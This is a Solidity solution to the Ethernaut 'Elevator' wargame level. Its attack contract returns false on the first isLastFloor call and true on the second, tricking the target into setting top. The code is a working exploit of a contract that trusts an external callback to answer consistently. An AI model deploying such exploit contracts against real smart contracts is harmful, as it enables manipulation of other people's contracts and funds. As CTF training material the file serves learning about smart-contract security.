// # Ethernaut 11: Elevator
//
// `Elevator` calls `isLastFloor` twice:
// 1. It only updates `floor` when `isLastFloor` is `false`.
// 2. It then sets `top` to the value returned by `isLastFloor`.
//
// We simply keep track of whether `isLastFloor` was called before in order to
// return the required value.

pragma solidity ^0.6.0;

import "./11_Elevator.sol";

contract ElevatorAttack is Building {
    bool isLastFloorWasCalled;
    Elevator elevator;

    constructor (address elevatorAddr) public {
        elevator = Elevator(elevatorAddr);
    }

    function goToTop () public {
        elevator.goTo(0);
    }

    function isLastFloor(uint) external override returns (bool) {
        if (isLastFloorWasCalled) {
            return true;
        } else {
            isLastFloorWasCalled = true;
            return false;
        }
    }
}
